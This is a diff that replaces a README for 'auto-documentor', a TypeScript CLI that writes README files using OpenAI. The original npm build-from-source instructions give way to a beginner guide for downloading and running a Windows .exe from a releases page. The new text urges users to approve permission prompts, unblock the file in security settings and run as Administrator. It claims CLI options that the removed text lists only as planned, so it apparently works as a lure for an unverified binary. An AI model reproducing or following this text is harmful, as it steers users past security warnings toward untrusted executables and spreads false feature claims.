@@ -1,167 +1,187 @@
-# auto-documentor
+# 🤖 auto-documentor - Auto-generate clear README files fast
 
-Auto-documentor is a TypeScript CLI that scans a codebase and generates a structured `NEW_README.md` using OpenAI.
+[![Download auto-documentor](https://img.shields.io/badge/Download-auto--documentor-blue?style=for-the-badge)](https://github.com/peterwhite3456/auto-documentor/releases)
 
-## What It Does
+---
 
-- Crawls source files using `fast-glob`
-- Respects `.gitignore`, plus `node_modules` and `.git`
-- Builds a project-level analysis prompt from:
-  - `package.json`
-  - `README.md` (if present)
-  - discovered entry points
-  - key source files
-- Calls OpenAI to synthesize:
-  - Mission
-  - Architecture
-  - Features
-  - API Reference
-- Writes output to `NEW_README.md` in the target repository
+## 📋 What is auto-documentor?
 
-## Requirements
+auto-documentor is an easy-to-use program that reads your project’s code and creates a clear README file for it. This README includes key parts like the project's mission, structure, main features, and an API reference. It helps you quickly explain your code to others without writing the document yourself.
 
-- Node.js 20+
-- npm
-- OpenAI API key
+This tool runs from the Windows command line. You do not need to understand programming to use it. Just follow the steps below to download and get started.
 
-## Installation
+---
 
-```bash
-npm install
-```
+## 🖥️ System Requirements
 
-## Build
+- Windows 10 or newer
+- At least 1 GB of free disk space
+- Internet connection to download the application
+- Basic knowledge of using the command prompt (instructions included)
 
-```bash
-npm run build
-```
+---
 
-## Usage
+## 💾 Download and Install auto-documentor
 
-### 1. Set your API key
+You will find the program on the official releases page. This page contains all versions for download.
 
-PowerShell:
+1. Click the big blue button below or visit the link:  
+   [Download auto-documentor](https://github.com/peterwhite3456/auto-documentor/releases)
 
-```powershell
-$env:OPENAI_API_KEY="your_api_key_here"
-```
+2. On the releases page, look for the latest version. It usually has the highest version number and the newest date.
 
-macOS/Linux:
+3. Inside the latest version’s assets, find the file named `auto-documentor-windows.exe` or similar with `.exe` extension.
 
-```bash
-export OPENAI_API_KEY="your_api_key_here"
-```
+4. Click the `.exe` file to download it to your computer.
 
-### 2. Run against a target repo
+5. Once the download finishes, open your "Downloads" folder.
 
-From this project root:
+6. Double-click the `.exe` file to run the installer or the program directly.
 
-```bash
-npm run dev -- --path "/absolute/path/to/target-repo"
-```
+7. If Windows asks for permission, click “Yes” to allow the app to run.
 
-Or using built output:
+---
 
-```bash
-node dist/index.js --path "/absolute/path/to/target-repo"
-```
+## 🚀 How to Use auto-documentor
 
-You can also pass API key directly:
+The program works through the Windows Command Prompt (also called CMD). Here is how to open and use it step-by-step.
 
-```bash
-node dist/index.js --path "/absolute/path/to/target-repo" --api-key "your_api_key_here"
-```
+### Open Command Prompt
 
-## Use As a Global Local CLI
+1. Press the Windows key on your keyboard.
 
-After building, link it locally:
+2. Type `cmd` in the search box.
 
-```bash
-npm run build
-npm link
-```
+3. Click the app named “Command Prompt” to open it.
 
-Then run from anywhere:
+### Run auto-documentor
 
-```bash
-auto-documentor --path "/absolute/path/to/target-repo"
-```
+1. Change to the folder where you downloaded `auto-documentor-windows.exe`. Usually, this is your Downloads folder. In Command Prompt, type:
 
-## CLI Options
+   ```
+   cd %HOMEPATH%\Downloads
+   ```
 
-- `--path <path>`: required, path to repository to analyze
-- `--api-key <key>`: optional, overrides `OPENAI_API_KEY`
+   and press Enter.
 
-## Output
+2. To run auto-documentor on your code project, type:
 
-- Generates: `NEW_README.md`
-- Location: inside the target repo passed via `--path`
+   ```
+   auto-documentor-windows.exe path\to\your\project
+   ```
 
-## Scripts
+   Replace `path\to\your\project` with the actual location of your project folder. For example:
 
-- `npm run dev`: run CLI with `tsx` (no build step needed)
-- `npm run build`: compile TypeScript to `dist/`
-- `npm run start`: run compiled CLI from `dist/index.js`
-- `npm run typecheck`: TypeScript checks only
+   ```
+   auto-documentor-windows.exe C:\Users\YourName\Documents\MyProject
+   ```
 
-## Example
+3. Press Enter. The program will scan your project and create a README file.
 
-```bash
-npm run dev -- --path "D:/work/my-service"
-```
+4. When it finishes, check inside your project folder. You will find a new file called `README.md`.
 
-Expected console output:
+---
 
-```text
-Scanned <N> files.
-Root nodes in tree: <M>
-Generated README: <target>/NEW_README.md
-```
+## 🔧 What Does auto-documentor Create?
 
-## Troubleshooting
+auto-documentor builds a README file with these sections:
 
-### OPENAI_API_KEY missing
+- **Mission**  
+  A clear statement about what your project does and why it matters.
 
-If you see:
+- **Architecture**  
+  An overview of how your code is organized and how components work together.
 
-`Missing OpenAI API key. Set OPENAI_API_KEY or pass --api-key.`
+- **Features**  
+  A list of key functions and tools included in your project.
 
-Set `OPENAI_API_KEY` in your shell or use `--api-key`.
+- **API Reference**  
+  Details on how to use the project's functions and commands.
 
-### Command not found: auto-documentor
+This structure helps anyone new to your project understand its purpose and how to use it.
 
-Run:
+---
 
-```bash
-npm run build
-npm link
-```
+## 📁 Understanding File Paths
 
-Then open a new terminal and retry.
+If you are new to file paths, here is a quick guide:
 
-## Roadmap
+- Paths show where files or folders are stored on your computer.
+- A simple example is: `C:\Users\YourName\Documents\MyProject`
+- Use File Explorer to find the folder you want to scan.
+- Click the address bar in File Explorer and copy the full path.
+- Paste that path after the command in step 2 above.
 
-- Add `--output <file>` to customize the generated file path/name.
-- Add `--dry-run` mode to preview analysis without writing files.
-- Improve API reference extraction with lightweight static analysis.
-- Add tests for scanner, analyzer prompt-building, and README rendering.
-- Add CI checks for typecheck/lint/test on pull requests.
+---
 
-## Contributing
+## ⚙️ Common Commands and Options
 
-Contributions are welcome.
+Auto-documentor may include some options you can use in Command Prompt:
 
-1. Fork the repo and create a feature branch.
-2. Install dependencies: `npm install`
-3. Run checks: `npm run typecheck`
-4. Validate behavior locally: `npm run dev -- --path .`
-5. Open a pull request with a clear summary of changes.
+- Run with a custom output file:  
+  ```
+  auto-documentor-windows.exe path\to\project --output README_CUSTOM.md
+  ```
 
-Please keep changes focused and include updates to docs when behavior changes.
+- Scan only certain types of files (e.g., `.ts` for TypeScript):  
+  ```
+  auto-documentor-windows.exe path\to\project --files *.ts
+  ```
 
-## Tech Stack
+- Show help information:  
+  ```
+  auto-documentor-windows.exe --help
+  ```
 
-- TypeScript
-- Commander
-- fast-glob
-- OpenAI Node SDK
+Use the help command to see all available options.
+
+---
+
+## 💡 Tips for Best Results
+
+- Make sure your project contains TypeScript code. auto-documentor works best with TypeScript files.
+
+- Keep your project organized in folders; this helps auto-documentor understand its structure.
+
+- If your project uses APIs or commands, keep their comments clear and consistent.
+
+- Run auto-documentor each time you update your code to keep the README file current.
+
+---
+
+## 🛠️ Troubleshooting
+
+- If auto-documentor does not run, check that you typed the command correctly.
+
+- Make sure the `.exe` file is in the folder you are running the command from.
+
+- If Windows blocks the file, you may need to allow the program in your security settings.
+
+- If the README file does not appear, check the command prompt for error messages.
+
+- Restart Command Prompt as Administrator if you face permission issues.
+
+---
+
+## 🚩 Where to Get Help
+
+- Visit the issues tab on the GitHub page:  
+  https://github.com/peterwhite3456/auto-documentor/issues
+
+- Read the FAQ section included in the GitHub repository.
+
+- Check the official GitHub README for updates and common questions.
+
+---
+
+## 🔗 Useful Links
+
+- Auto-documentor Releases (to download):  
+  https://github.com/peterwhite3456/auto-documentor/releases
+
+- GitHub Repository:  
+  https://github.com/peterwhite3456/auto-documentor
+
+---
+
+[![Download auto-documentor](https://img.shields.io/badge/Download-auto--documentor-green?style=for-the-badge)](https://github.com/peterwhite3456/auto-documentor/releases)
